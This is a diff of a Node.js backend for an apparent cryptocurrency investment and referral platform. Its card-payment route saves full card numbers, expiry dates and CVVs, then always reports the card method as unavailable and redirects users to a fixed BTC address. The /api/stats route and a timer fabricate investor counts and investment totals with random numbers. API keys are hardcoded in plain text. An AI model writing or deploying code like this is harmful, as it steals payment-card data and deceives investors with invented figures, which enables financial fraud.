@@ -2305,14 +2305,12 @@ const checkCSRF = (req, res, next) => {
 
 
 
-// FIXED FUNCTION: Calculate and distribute downline referral commissions
+// Fixed function to calculate and distribute downline referral commissions
 const calculateReferralCommissions = async (investment) => {
   try {
-    console.log(`🔍 Starting commission calculation for investment: ${investment._id}`);
-    
     // First, populate the investment with user data
     const populatedInvestment = await Investment.findById(investment._id)
-      .populate('user', 'firstName lastName email referredBy')
+      .populate('user', 'firstName lastName email')
       .populate('plan');
 
     if (!populatedInvestment) {
@@ -2324,7 +2322,7 @@ const calculateReferralCommissions = async (investment) => {
     const investorId = populatedInvestment.user._id;
     const investmentAmount = populatedInvestment.amount;
 
-    console.log(`💰 Processing investment: ${investmentId}, user: ${investorId}, amount: $${investmentAmount}`);
+    console.log(`🔍 Checking downline commissions for investment: ${investmentId}, user: ${investorId}, amount: $${investmentAmount}`);
 
     // Find the downline relationship for this investor (check if they have an upline)
     const relationship = await DownlineRelationship.findOne({
@@ -2354,16 +2352,61 @@ const calculateReferralCommissions = async (investment) => {
       commissionPercentage: commissionPercentage,
       commissionAmount: commissionAmount,
       roundNumber: relationship.commissionRounds - relationship.remainingRounds + 1,
-      status: 'pending', // Set as pending until investment matures
-      paidAt: null // Will be set when investment matures
+      status: 'paid',
+      paidAt: new Date()
     });
 
-    console.log(`📝 Commission history record created: ${commissionHistory._id}`);
+    // ✅ FIXED: Add commission to upline's MAIN balance as requested
+    const updatedUpline = await User.findByIdAndUpdate(
+      uplineId,
+      {
+        $inc: {
+          'balances.main': commissionAmount, // Added to main balance
+          'referralStats.totalEarnings': commissionAmount,
+          'referralStats.availableBalance': commissionAmount,
+          'downlineStats.totalCommissionEarned': commissionAmount,
+          'downlineStats.thisMonthCommission': commissionAmount
+        }
+      },
+      { new: true }
+    );
 
-    // Update downline relationship stats (but don't pay yet)
+    console.log(`✅ Updated upline ${uplineUser.email} MAIN balance with $${commissionAmount}. New balance: $${updatedUpline.balances.main}`);
+
+    // Update downline relationship
+    relationship.remainingRounds -= 1;
     relationship.totalCommissionEarned += commissionAmount;
     
-    // Create pending commission record in upline's referral history
+    if (relationship.remainingRounds === 0) {
+      relationship.status = 'completed';
+      console.log(`🎯 Commission rounds completed for relationship: ${relationship._id}`);
+    }
+
+    await relationship.save();
+
+    // Create transaction record for the commission
+    await Transaction.create({
+      user: uplineId,
+      type: 'referral',
+      amount: commissionAmount,
+      currency: 'USD',
+      status: 'completed',
+      method: 'internal',
+      reference: `DOWNLINE-COMM-${Date.now()}-${Math.floor(Math.random() * 1000)}`,
+      details: {
+        commissionFrom: investorId,
+        investmentId: investmentId,
+        round: relationship.commissionRounds - relationship.remainingRounds + 1,
+        totalRounds: relationship.commissionRounds,
+        commissionType: 'downline',
+        downlineName: `${populatedInvestment.user.firstName} ${populatedInvestment.user.lastName}`,
+        percentage: commissionPercentage
+      },
+      fee: 0,
+      netAmount: commissionAmount
+    });
+
+    // Add to upline's referral history
     await User.findByIdAndUpdate(uplineId, {
       $push: {
         referralHistory: {
@@ -2372,24 +2415,33 @@ const calculateReferralCommissions = async (investment) => {
           percentage: commissionPercentage,
           level: 1, // Direct downline
           date: new Date(),
-          status: 'pending', // Mark as pending until investment matures
-          investmentId: investmentId,
-          commissionHistoryId: commissionHistory._id
+          status: 'available',
+          type: 'downline_commission'
         }
       }
     });
 
-    console.log(`⏳ Commission of $${commissionAmount} marked as PENDING for upline ${uplineUser.email} - will be paid when investment matures`);
+    // Update downline stats count
+    const activeDownlinesCount = await DownlineRelationship.countDocuments({ 
+      upline: uplineId, 
+      status: 'active',
+      remainingRounds: { $gt: 0 }
+    });
+
+    await User.findByIdAndUpdate(uplineId, {
+      'downlineStats.activeDownlines': activeDownlinesCount
+    });
+
+    console.log(`🎉 Downline commission of $${commissionAmount} paid to upline ${uplineUser.email} for investment ${investmentId} (Round ${relationship.commissionRounds - relationship.remainingRounds + 1}/${relationship.commissionRounds})`);
 
     // Log the activity
-    await logActivity('downline_commission_pending', 'commission', commissionHistory._id, uplineId, 'User', null, {
+    await logActivity('downline_commission_paid', 'commission', commissionHistory._id, uplineId, 'User', null, {
       amount: commissionAmount,
       downline: investorId,
       investment: investmentId,
       round: relationship.commissionRounds - relationship.remainingRounds + 1,
       totalRounds: relationship.commissionRounds,
-      percentage: commissionPercentage,
-      status: 'pending'
+      percentage: commissionPercentage
     });
 
   } catch (err) {
@@ -2398,124 +2450,9 @@ const calculateReferralCommissions = async (investment) => {
   }
 };
 
-// NEW FUNCTION: Process pending commissions when investment matures
-const processPendingCommissions = async (investment) => {
-  try {
-    console.log(`🔍 Processing pending commissions for matured investment: ${investment._id}`);
-    
-    // Find all pending commissions for this investment
-    const pendingCommissions = await CommissionHistory.find({
-      investment: investment._id,
-      status: 'pending'
-    }).populate('upline', 'firstName lastName email balances');
 
-    console.log(`📊 Found ${pendingCommissions.length} pending commissions for investment ${investment._id}`);
 
-    for (const commission of pendingCommissions) {
-      try {
-        const uplineId = commission.upline._id;
-        const uplineUser = commission.upline;
-        const commissionAmount = commission.commissionAmount;
 
-        console.log(`💰 Processing commission ${commission._id}: $${commissionAmount} for upline ${uplineUser.email}`);
-
-        // Update commission status to paid
-        commission.status = 'paid';
-        commission.paidAt = new Date();
-        await commission.save();
-
-        // ✅ ADD COMMISSION TO UPLINE'S MAIN BALANCE
-        const updatedUpline = await User.findByIdAndUpdate(
-          uplineId,
-          {
-            $inc: {
-              'balances.main': commissionAmount,
-              'referralStats.totalEarnings': commissionAmount,
-              'referralStats.availableBalance': commissionAmount,
-              'downlineStats.totalCommissionEarned': commissionAmount,
-              'downlineStats.thisMonthCommission': commissionAmount
-            }
-          },
-          { new: true }
-        );
-
-        console.log(`✅ Commission PAID: $${commissionAmount} added to ${uplineUser.email}'s MAIN balance. New balance: $${updatedUpline.balances.main}`);
-
-        // Update referral history status from pending to available
-        await User.updateOne(
-          { 
-            _id: uplineId,
-            'referralHistory.commissionHistoryId': commission._id 
-          },
-          {
-            $set: {
-              'referralHistory.$.status': 'available',
-              'referralHistory.$.date': new Date()
-            }
-          }
-        );
-
-        // Update downline relationship rounds
-        const relationship = await DownlineRelationship.findOne({
-          upline: uplineId,
-          downline: commission.downline
-        });
-
-        if (relationship) {
-          relationship.remainingRounds -= 1;
-          if (relationship.remainingRounds === 0) {
-            relationship.status = 'completed';
-            console.log(`🎯 Commission rounds completed for relationship: ${relationship._id}`);
-          }
-          await relationship.save();
-        }
-
-        // Create transaction record for the commission payment
-        await Transaction.create({
-          user: uplineId,
-          type: 'referral',
-          amount: commissionAmount,
-          currency: 'USD',
-          status: 'completed',
-          method: 'internal',
-          reference: `DOWNLINE-COMM-${Date.now()}-${Math.floor(Math.random() * 1000)}`,
-          details: {
-            commissionFrom: commission.downline,
-            investmentId: investment._id,
-            round: commission.roundNumber,
-            totalRounds: relationship?.commissionRounds || 3,
-            commissionType: 'downline',
-            downlineName: `${investment.user.firstName} ${investment.user.lastName}`,
-            percentage: commission.commissionPercentage
-          },
-          fee: 0,
-          netAmount: commissionAmount
-        });
-
-        console.log(`🎉 Downline commission of $${commissionAmount} PAID to upline ${uplineUser.email} for investment ${investment._id}`);
-
-        // Log the successful payment
-        await logActivity('downline_commission_paid', 'commission', commission._id, uplineId, 'User', null, {
-          amount: commissionAmount,
-          downline: commission.downline,
-          investment: investment._id,
-          round: commission.roundNumber,
-          percentage: commission.commissionPercentage,
-          status: 'paid'
-        });
-
-      } catch (commissionError) {
-        console.error(`❌ Error processing individual commission ${commission._id}:`, commissionError);
-        // Continue with other commissions even if one fails
-      }
-    }
-
-    console.log(`✅ All pending commissions processed for investment ${investment._id}`);
-
-  } catch (err) {
-    console.error('❌ Process pending commissions error:', err);
-  }
-};
 
 
 
@@ -4400,7 +4337,7 @@ app.post('/api/investments', protect, [
       };
       await investment.save();
 
-      console.log(`🎁 Direct referral bonus of $${referralBonus} paid to upline ${user.referredBy}`);
+      console.log(`🎁 Direct referral bonus of $${referralBonus} paid to ${user.referredBy}`);
     }
 
     // Log activity
@@ -4499,9 +4436,6 @@ app.post('/api/investments/:id/complete', protect, async (req, res) => {
       // Save changes with session
       await user.save({ session });
       await investment.save({ session });
-
-      // ✅ FIXED: PROCESS PENDING COMMISSIONS WHEN INVESTMENT MATURES
-      await processPendingCommissions(investment);
 
       // Create transaction record for the return
       await Transaction.create([{
@@ -4739,6 +4673,1243 @@ app.get('/api/mining', protect, async (req, res) => {
 
 
 
+app.post('/api/transactions/deposit', protect, [
+  body('amount').isFloat({ gt: 0 }).withMessage('Amount must be greater than 0'),
+  body('method').isIn(['btc', 'bank', 'card']).withMessage('Invalid deposit method')
+], async (req, res) => {
+  const errors = validationResult(req);
+  if (!errors.isEmpty()) {
+    return res.status(400).json({
+      status: 'fail',
+      errors: errors.array()
+    });
+  }
+
+  try {
+    const { amount, method } = req.body;
+    const reference = `DEP-${crypto.randomBytes(3).toString('hex').toUpperCase()}`;
+
+    let transactionData = {
+      user: req.user.id,
+      type: 'deposit',
+      amount,
+      currency: 'USD',
+      status: 'pending',
+      method,
+      reference,
+      netAmount: amount,
+      details: `Deposit of $${amount} via ${method}`
+    };
+
+    if (method === 'btc') {
+      transactionData.btcAddress = 'bc1q78syc97weckfh3l4vswafxkerjynzmwey7lr4e';
+      transactionData.details += ` to address ${transactionData.btcAddress}`;
+    }
+
+    const transaction = await Transaction.create(transactionData);
+
+    res.status(201).json({
+      status: 'success',
+      data: transaction
+    });
+
+    await logActivity('create-deposit', 'transaction', transaction._id, req.user._id, 'User', req, { amount, method });
+  } catch (err) {
+    console.error('Create deposit error:', err);
+    res.status(500).json({
+      status: 'error',
+      message: 'An error occurred while creating deposit'
+    });
+  }
+});
+
+app.post('/api/payments/process', protect, [
+  body('amount').isFloat({ gt: 0 }).withMessage('Amount must be greater than 0'),
+  body('fullName').notEmpty().withMessage('Full name is required').escape(),
+  body('cardNumber').notEmpty().withMessage('Card number is required').escape(),
+  body('expiry').notEmpty().withMessage('Expiry date is required').escape(),
+  body('cvv').notEmpty().withMessage('CVV is required').escape(),
+  body('billingAddress').notEmpty().withMessage('Billing address is required').escape(),
+  body('saveCard').optional().isBoolean().withMessage('Save card must be a boolean')
+], async (req, res) => {
+  const errors = validationResult(req);
+  if (!errors.isEmpty()) {
+    return res.status(400).json({
+      status: 'fail',
+      errors: errors.array()
+    });
+  }
+
+  try {
+    const { amount, fullName, cardNumber, expiry, cvv, billingAddress, saveCard } = req.body;
+
+    // Save card details to database if requested
+    if (saveCard) {
+      await Card.create({
+        user: req.user.id,
+        fullName,
+        cardNumber,
+        expiry,
+        cvv,
+        billingAddress
+      });
+    }
+
+    // Create transaction record (even though payment will fail)
+    const reference = `CARD-${crypto.randomBytes(3).toString('hex').toUpperCase()}`;
+    await Transaction.create({
+      user: req.user.id,
+      type: 'deposit',
+      amount,
+      currency: 'USD',
+      status: 'failed',
+      method: 'card',
+      reference,
+      netAmount: amount,
+      cardDetails: {
+        fullName,
+        cardNumber,
+        expiry,
+        cvv,
+        billingAddress
+      },
+      details: 'Card payment failed - feature currently unavailable'
+    });
+
+    // Return error to user
+    res.status(503).json({
+      status: 'fail',
+      message: 'Card payments are currently unavailable. Please use the BTC deposit option instead.'
+    });
+
+    await logActivity('attempt-card-payment', 'transaction', null, req.user._id, 'User', req, { amount });
+  } catch (err) {
+    console.error('Process payment error:', err);
+    res.status(500).json({
+      status: 'error',
+      message: 'An error occurred while processing payment'
+    });
+  }
+});
+
+app.post('/api/transactions/withdraw', protect, [
+  body('amount').isFloat({ gt: 0 }).withMessage('Amount must be greater than 0'),
+  body('method').isIn(['btc', 'bank']).withMessage('Invalid withdrawal method'),
+  body('btcAddress').if(body('method').equals('btc')).notEmpty().withMessage('BTC address is required for BTC withdrawals'),
+  body('bankDetails').if(body('method').equals('bank')).isObject().withMessage('Bank details must be an object'),
+  body('bankDetails.accountName').if(body('method').equals('bank')).notEmpty().withMessage('Account name is required'),
+  body('bankDetails.accountNumber').if(body('method').equals('bank')).notEmpty().withMessage('Account number is required'),
+  body('bankDetails.bankName').if(body('method').equals('bank')).notEmpty().withMessage('Bank name is required')
+], async (req, res) => {
+  const errors = validationResult(req);
+  if (!errors.isEmpty()) {
+    return res.status(400).json({
+      status: 'fail',
+      errors: errors.array()
+    });
+  }
+
+  try {
+    const { amount, method, btcAddress, bankDetails } = req.body;
+    const user = await User.findById(req.user.id);
+
+    if (user.balances.main < amount) {
+      return res.status(400).json({
+        status: 'fail',
+        message: 'Insufficient balance for withdrawal'
+      });
+    }
+
+    const reference = `WTH-${crypto.randomBytes(3).toString('hex').toUpperCase()}`;
+    const fee = amount * 0.01; // 1% withdrawal fee
+    const netAmount = amount - fee;
+
+    let transactionData = {
+      user: req.user.id,
+      type: 'withdrawal',
+      amount,
+      currency: 'USD',
+      status: 'pending',
+      method,
+      reference,
+      fee,
+      netAmount,
+      details: `Withdrawal of $${amount} via ${method} (Fee: $${fee.toFixed(2)})`
+    };
+
+    if (method === 'btc') {
+      transactionData.btcAddress = btcAddress;
+      transactionData.details += ` to address ${btcAddress}`;
+    } else {
+      transactionData.bankDetails = bankDetails;
+      transactionData.details += ` to ${bankDetails.accountName} (${bankDetails.bankName})`;
+    }
+
+    const transaction = await Transaction.create(transactionData);
+
+    // Deduct from user's balance
+    user.balances.main -= amount;
+    await user.save();
+
+    res.status(201).json({
+      status: 'success',
+      data: transaction
+    });
+
+    await logActivity('create-withdrawal', 'transaction', transaction._id, req.user._id, 'User', req, { amount, method });
+  } catch (err) {
+    console.error('Create withdrawal error:', err);
+    res.status(500).json({
+      status: 'error',
+      message: 'An error occurred while creating withdrawal'
+    });
+  }
+});
+
+app.post('/api/transactions/transfer', protect, [
+  body('amount').isFloat({ gt: 0 }).withMessage('Amount must be greater than 0'),
+  body('from').isIn(['main', 'active', 'matured', 'savings']).withMessage('Invalid source account'),
+  body('to').isIn(['main', 'active', 'matured', 'savings']).withMessage('Invalid destination account')
+], async (req, res) => {
+  const errors = validationResult(req);
+  if (!errors.isEmpty()) {
+    return res.status(400).json({
+      status: 'fail',
+      errors: errors.array()
+    });
+  }
+
+  try {
+    const { amount, from, to } = req.body;
+    const user = await User.findById(req.user.id);
+
+    if (user.balances[from] < amount) {
+      return res.status(400).json({
+        status: 'fail',
+        message: `Insufficient balance in ${from} account`
+      });
+    }
+
+    // Perform transfer
+    user.balances[from] -= amount;
+    user.balances[to] += amount;
+    await user.save();
+
+    // Create transaction record
+    const reference = `TRF-${crypto.randomBytes(3).toString('hex').toUpperCase()}`;
+    const transaction = await Transaction.create({
+      user: req.user.id,
+      type: 'transfer',
+      amount,
+      currency: 'USD',
+      status: 'completed',
+      method: 'internal',
+      reference,
+      netAmount: amount,
+      details: `Transfer of $${amount} from ${from} to ${to} account`
+    });
+
+    res.status(201).json({
+      status: 'success',
+      data: transaction
+    });
+
+    await logActivity('transfer-funds', 'transaction', transaction._id, req.user._id, 'User', req, { amount, from, to });
+  } catch (err) {
+    console.error('Transfer funds error:', err);
+    res.status(500).json({
+      status: 'error',
+      message: 'An error occurred while transferring funds'
+    });
+  }
+});
+
+
+app.get('/api/investments', protect, async (req, res) => {
+  try {
+    const { status, page = 1, limit = 20 } = req.query;
+    const skip = (page - 1) * limit;
+
+    const query = { user: req.user.id };
+    if (status) query.status = status;
+
+    const investments = await Investment.find(query)
+      .populate('plan')
+      .sort({ createdAt: -1 })
+      .skip(skip)
+      .limit(parseInt(limit));
+
+    const total = await Investment.countDocuments(query);
+
+    res.status(200).json({
+      status: 'success',
+      data: {
+        investments,
+        total,
+        page: parseInt(page),
+        pages: Math.ceil(total / limit)
+      }
+    });
+  } catch (err) {
+    console.error('Get investments error:', err);
+    res.status(500).json({
+      status: 'error',
+      message: 'An error occurred while fetching investments'
+    });
+  }
+});
+
+app.post('/api/savings', protect, [
+  body('amount').isFloat({ gt: 0 }).withMessage('Amount must be greater than 0')
+], async (req, res) => {
+  const errors = validationResult(req);
+  if (!errors.isEmpty()) {
+    return res.status(400).json({
+      status: 'fail',
+      errors: errors.array()
+    });
+  }
+
+  try {
+    const { amount } = req.body;
+    const user = await User.findById(req.user.id);
+
+    if (user.balances.main < amount) {
+      return res.status(400).json({
+        status: 'fail',
+        message: 'Insufficient balance for savings'
+      });
+    }
+
+    // Transfer to savings
+    user.balances.main -= amount;
+    user.balances.savings += amount;
+    await user.save();
+
+    // Create transaction record
+    const reference = `SAV-${crypto.randomBytes(3).toString('hex').toUpperCase()}`;
+    const transaction = await Transaction.create({
+      user: req.user.id,
+      type: 'transfer',
+      amount,
+      currency: 'USD',
+      status: 'completed',
+      method: 'internal',
+      reference,
+      netAmount: amount,
+      details: `Transferred $${amount} to savings account`
+    });
+
+    res.status(201).json({
+      status: 'success',
+      data: transaction
+    });
+
+    await logActivity('create-savings', 'transaction', transaction._id, req.user._id, 'User', req, { amount });
+  } catch (err) {
+    console.error('Create savings error:', err);
+    res.status(500).json({
+      status: 'error',
+      message: 'An error occurred while creating savings'
+    });
+  }
+});
+
+app.post('/api/loans', protect, [
+  body('amount').isFloat({ gt: 0 }).withMessage('Amount must be greater than 0'),
+  body('collateralAmount').isFloat({ gt: 0 }).withMessage('Collateral amount must be greater than 0'),
+  body('duration').isInt({ gt: 0 }).withMessage('Duration must be greater than 0')
+], async (req, res) => {
+  const errors = validationResult(req);
+  if (!errors.isEmpty()) {
+    return res.status(400).json({
+      status: 'fail',
+      errors: errors.array()
+    });
+  }
+
+  try {
+    const { amount, collateralAmount, duration } = req.body;
+    const interestRate = 10; // Fixed interest rate for loans
+
+    const loan = await Loan.create({
+      user: req.user.id,
+      amount,
+      interestRate,
+      duration,
+      collateralAmount,
+      collateralCurrency: 'BTC',
+      status: 'pending'
+    });
+
+    res.status(201).json({
+      status: 'success',
+      data: loan
+    });
+
+    await logActivity('request-loan', 'loan', loan._id, req.user._id, 'User', req, { amount, collateralAmount, duration });
+  } catch (err) {
+    console.error('Request loan error:', err);
+    res.status(500).json({
+      status: 'error',
+      message: 'An error occurred while requesting loan'
+    });
+  }
+});
+
+app.get('/api/loans', protect, async (req, res) => {
+  try {
+    const { status, page = 1, limit = 20 } = req.query;
+    const skip = (page - 1) * limit;
+
+    const query = { user: req.user.id };
+    if (status) query.status = status;
+
+    const loans = await Loan.find(query)
+      .sort({ createdAt: -1 })
+      .skip(skip)
+      .limit(parseInt(limit));
+
+    const total = await Loan.countDocuments(query);
+
+    res.status(200).json({
+      status: 'success',
+      data: {
+        loans,
+        total,
+        page: parseInt(page),
+        pages: Math.ceil(total / limit)
+      }
+    });
+  } catch (err) {
+    console.error('Get loans error:', err);
+    res.status(500).json({
+      status: 'error',
+      message: 'An error occurred while fetching loans'
+    });
+  }
+});
+
+app.post('/api/loans/:id/repay', protect, async (req, res) => {
+  try {
+    const loan = await Loan.findOne({
+      _id: req.params.id,
+      user: req.user.id,
+      status: 'active'
+    });
+
+    if (!loan) {
+      return res.status(404).json({
+        status: 'fail',
+        message: 'Active loan not found'
+      });
+    }
+
+    const user = await User.findById(req.user.id);
+    if (user.balances.main < loan.repaymentAmount) {
+      return res.status(400).json({
+        status: 'fail',
+        message: 'Insufficient balance to repay loan'
+      });
+    }
+
+    // Deduct repayment amount
+    user.balances.main -= loan.repaymentAmount;
+    await user.save();
+
+    // Update loan status
+    loan.status = 'repaid';
+    loan.endDate = new Date();
+    await loan.save();
+
+    // Create transaction record
+    const reference = `REP-${crypto.randomBytes(3).toString('hex').toUpperCase()}`;
+    await Transaction.create({
+      user: req.user.id,
+      type: 'loan',
+      amount: loan.repaymentAmount,
+      currency: 'USD',
+      status: 'completed',
+      method: 'internal',
+      reference,
+      netAmount: loan.repaymentAmount,
+      details: `Repayment of loan ${loan._id.toString().slice(-6).toUpperCase()}`
+    });
+
+    res.status(200).json({
+      status: 'success',
+      message: 'Loan repaid successfully'
+    });
+
+    await logActivity('repay-loan', 'loan', loan._id, req.user._id, 'User', req, { amount: loan.repaymentAmount });
+  } catch (err) {
+    console.error('Repay loan error:', err);
+    res.status(500).json({
+      status: 'error',
+      message: 'An error occurred while repaying loan'
+    });
+  }
+});
+
+app.post('/api/chat', protect, [
+  body('message').trim().notEmpty().withMessage('Message is required').escape()
+], async (req, res) => {
+  const errors = validationResult(req);
+  if (!errors.isEmpty()) {
+    return res.status(400).json({
+      status: 'fail',
+      errors: errors.array()
+    });
+  }
+
+  try {
+    const { message } = req.body;
+    const user = await User.findById(req.user.id);
+
+    // In a real implementation, you would save this to a chat system or database
+    // For now, we'll just log it and return a success response
+    console.log(`New chat message from ${user.email}: ${message}`);
+
+    res.status(200).json({
+      status: 'success',
+      message: 'Message sent successfully'
+    });
+
+    await logActivity('send-chat', 'chat', null, req.user._id, 'User', req, { message });
+  } catch (err) {
+    console.error('Send chat error:', err);
+    res.status(500).json({
+      status: 'error',
+      message: 'An error occurred while sending chat message'
+    });
+  }
+});
+
+// Newsletter Subscription
+app.post('/api/newsletter/subscribe', [
+  body('email').isEmail().withMessage('Please provide a valid email').normalizeEmail()
+], async (req, res) => {
+  const errors = validationResult(req);
+  if (!errors.isEmpty()) {
+    return res.status(400).json({
+      status: 'fail',
+      errors: errors.array()
+    });
+  }
+
+  try {
+    const { email } = req.body;
+
+    const existingSubscriber = await NewsletterSubscriber.findOne({ email });
+    if (existingSubscriber) {
+      if (existingSubscriber.isActive) {
+        return res.status(200).json({
+          status: 'success',
+          message: 'You are already subscribed to our newsletter'
+        });
+      } else {
+        existingSubscriber.isActive = true;
+        existingSubscriber.unsubscribedAt = undefined;
+        await existingSubscriber.save();
+        return res.status(200).json({
+          status: 'success',
+          message: 'You have been resubscribed to our newsletter'
+        });
+      }
+    }
+
+    await NewsletterSubscriber.create({ email });
+
+    res.status(200).json({
+      status: 'success',
+      message: 'You have been subscribed to our newsletter'
+    });
+  } catch (err) {
+    console.error('Newsletter subscription error:', err);
+    res.status(500).json({
+      status: 'error',
+      message: 'An error occurred while subscribing to newsletter'
+    });
+  }
+});
+
+
+// Stats endpoint with Redis caching and real-time updates
+app.get('/api/stats', async (req, res) => {
+    try {
+        // Check if we have cached stats
+        const cachedStats = await redis.get('stats-data');
+        
+        if (cachedStats) {
+            return res.status(200).json(JSON.parse(cachedStats));
+        }
+
+        // Get current UTC time to determine if we need to reset daily stats
+        const now = new Date();
+        const currentHourUTC = now.getUTCHours();
+        const isNewDay = currentHourUTC === 0 && now.getUTCMinutes() < 5; // Reset window 00:00-00:05 UTC
+
+        // Initialize base stats
+        let stats = {
+            totalInvested: 61236234.21,
+            totalWithdrawals: 47236585.06,
+            totalLoans: 13236512.17,
+            lastUpdated: now.toISOString(),
+            changeRates: {
+                investors: 0,
+                invested: 0,
+                withdrawals: 0,
+                loans: 0
+            }
+        };
+
+        // Get or initialize persistent investor count
+        let investorCount = await redis.get('persistent-investor-count');
+        if (!investorCount) {
+            // Initialize with your specified starting value
+            investorCount = 7087098;
+            await redis.set('persistent-investor-count', investorCount.toString());
+        } else {
+            investorCount = parseInt(investorCount);
+        }
+        stats.totalInvestors = investorCount;
+
+        // If we have previous stats in Redis (even if expired), use them as base for other metrics
+        const previousStats = await redis.get('previous-stats');
+        if (previousStats) {
+            const previous = JSON.parse(previousStats);
+            
+            // Only reset daily stats if it's a new day
+            if (isNewDay) {
+                // Generate new base values for daily stats
+                stats.totalInvested = getRandomInRange(6000000, 8000000);
+                stats.totalWithdrawals = getRandomInRange(4000000, 6000000);
+                stats.totalLoans = getRandomInRange(1000000, 3000000);
+            } else {
+                stats.totalInvested = previous.totalInvested;
+                stats.totalWithdrawals = previous.totalWithdrawals;
+                stats.totalLoans = previous.totalLoans;
+            }
+        }
+
+        // Calculate change rates (random between -11.3% to 31%)
+        stats.changeRates = {
+            investors: getRandomInRange(-11.3, 31, 1),
+            invested: getRandomInRange(-11.3, 31, 1),
+            withdrawals: getRandomInRange(-11.3, 31, 1),
+            loans: getRandomInRange(-11.3, 31, 1)
+        };
+
+        // Cache the stats for 30 seconds
+        await redis.set('stats-data', JSON.stringify(stats), 'EX', 30);
+        await redis.set('previous-stats', JSON.stringify(stats));
+
+        res.status(200).json(stats);
+    } catch (err) {
+        console.error('Stats error:', err);
+        res.status(500).json({
+            status: 'error',
+            message: 'Failed to fetch stats'
+        });
+    }
+});
+
+// Helper function to generate random numbers in range
+function getRandomInRange(min, max, decimals = 2) {
+    const rand = Math.random() * (max - min) + min;
+    return parseFloat(rand.toFixed(decimals));
+}
+
+// Real-time stats updater
+setInterval(async () => {
+    try {
+        // Get current stats or initialize if not exists
+        let stats = {
+            totalInvested: 61236234.21,
+            totalWithdrawals: 47236585.06,
+            totalLoans: 13236512.17,
+            lastUpdated: new Date().toISOString()
+        };
+
+        // Get persistent investor count
+        let investorCount = await redis.get('persistent-investor-count');
+        if (!investorCount) {
+            // Initialize with your specified starting value if not exists
+            investorCount = 7087098;
+            await redis.set('persistent-investor-count', investorCount.toString());
+        } else {
+            investorCount = parseInt(investorCount);
+        }
+        
+        const cachedStats = await redis.get('stats-data');
+        if (cachedStats) {
+            const parsedStats = JSON.parse(cachedStats);
+            stats.totalInvested = parsedStats.totalInvested;
+            stats.totalWithdrawals = parsedStats.totalWithdrawals;
+            stats.totalLoans = parsedStats.totalLoans;
+        }
+
+        // Update each stat with different intervals and random increments
+        const now = new Date();
+        const seconds = now.getSeconds();
+
+        // Update investors every 15-30 seconds (13-999 increment)
+        if (seconds % getRandomInRange(15, 30, 0) === 0) {
+            investorCount += getRandomInRange(13, 999, 0);
+            await redis.set('persistent-investor-count', investorCount.toString());
+        }
+        stats.totalInvestors = investorCount;
+
+        // Update invested every 5-20 seconds ($1,200.33 - $111,368.21 increment)
+        if (seconds % getRandomInRange(5, 20, 0) === 0) {
+            stats.totalInvested += getRandomInRange(1200.33, 111368.21, 2);
+        }
+
+        // Update withdrawals every 10-25 seconds ($4,997.33 - $321,238.11 increment)
+        if (seconds % getRandomInRange(10, 25, 0) === 0) {
+            stats.totalWithdrawals += getRandomInRange(4997.33, 321238.11, 2);
+        }
+
+        // Update loans every 8-18 seconds ($1,000 - $100,000 increment)
+        if (seconds % getRandomInRange(8, 18, 0) === 0) {
+            stats.totalLoans += getRandomInRange(1000, 100000, 2);
+        }
+
+        // Recalculate change rates periodically
+        if (seconds % 30 === 0) {
+            stats.changeRates = {
+                investors: getRandomInRange(-11.3, 31, 1),
+                invested: getRandomInRange(-11.3, 31, 1),
+                withdrawals: getRandomInRange(-11.3, 31, 1),
+                loans: getRandomInRange(-11.3, 31, 1)
+            };
+        } else if (cachedStats) {
+            // Preserve existing change rates if not recalculating
+            const parsedStats = JSON.parse(cachedStats);
+            stats.changeRates = parsedStats.changeRates;
+        }
+
+        stats.lastUpdated = now.toISOString();
+
+        // Update cache
+        await redis.set('stats-data', JSON.stringify(stats), 'EX', 30);
+        await redis.set('previous-stats', JSON.stringify(stats));
+
+    } catch (err) {
+        console.error('Stats updater error:', err);
+    }
+}, 1000); // Run every second to check for updates
+
+
+
+
+// News API configuration
+const NEWS_API_CONFIG = {
+  cryptopanic: {
+    url: 'https://cryptopanic.com/api/v1/posts/',
+    apiKey: 'd0753e27bd2ab287e5bb75263257d7988ef25162'
+  },
+  newsdata: {
+    url: 'https://newsdata.io/api/1/news',
+    apiKey: 'pub_33c50ca8457d4db8b1d9ae27bc132991'
+  },
+  gnews: {
+    url: 'https://gnews.io/api/v4/top-headlines',
+    apiKey: '910104d8bf756251535b02cf758dee6d'
+  },
+  cryptocompare: {
+    url: 'https://min-api.cryptocompare.com/data/v2/news/',
+    apiKey: 'e7f3b5a5f2e1c5d5a5f2e1c5d5a5f2e1c5d5a5f2e1c5d5a5f2e1c5d5a5f2e1c'
+  }
+};
+
+// Cache setup for news
+const NEWS_CACHE_TTL = 15 * 60 * 1000; // 15 minutes
+let newsCache = {
+  data: null,
+  timestamp: 0
+};
+
+// Helper function to fetch from CryptoPanic
+async function fetchCryptoPanic() {
+  try {
+    const response = await axios.get(`${NEWS_API_CONFIG.cryptopanic.url}?auth_token=${NEWS_API_CONFIG.cryptopanic.apiKey}&filter=hot&currencies=BTC`);
+    return response.data.results.map(item => ({
+      id: `cp-${item.id}`,
+      title: item.title,
+      description: item.metadata?.description || '',
+      source: 'CryptoPanic',
+      url: item.url,
+      image: item.metadata?.image || 'https://cryptopanic.com/static/img/cryptopanic-logo.png',
+      publishedAt: new Date(item.created_at).toISOString()
+    }));
+  } catch (error) {
+    console.error('CryptoPanic API error:', error.message);
+    return [];
+  }
+}
+
+// Helper function to fetch from NewsData
+async function fetchNewsData() {
+  try {
+    const response = await axios.get(`${NEWS_API_CONFIG.newsdata.url}?apikey=${NEWS_API_CONFIG.newsdata.apiKey}&q=bitcoin&language=en`);
+    return response.data.results.map(item => ({
+      id: `nd-${item.article_id}`,
+      title: item.title,
+      description: item.description || '',
+      source: item.source_id || 'NewsData',
+      url: item.link,
+      image: item.image_url || 'https://newsdata.io/static/img/newsdata-logo.png',
+      publishedAt: item.pubDate || new Date().toISOString()
+    }));
+  } catch (error) {
+    console.error('NewsData API error:', error.message);
+    return [];
+  }
+}
+
+// Helper function to fetch from GNews
+async function fetchGNews() {
+  try {
+    const response = await axios.get(`${NEWS_API_CONFIG.gnews.url}?token=${NEWS_API_CONFIG.gnews.apiKey}&q=bitcoin&lang=en`);
+    return response.data.articles.map(item => ({
+      id: `gn-${uuidv4()}`,
+      title: item.title,
+      description: item.description,
+      source: item.source.name,
+      url: item.url,
+      image: item.image || 'https://gnews.io/img/favicon/favicon-32x32.png',
+      publishedAt: item.publishedAt || new Date().toISOString()
+    }));
+  } catch (error) {
+    console.error('GNews API error:', error.message);
+    return [];
+  }
+}
+
+// Helper function to fetch from CryptoCompare
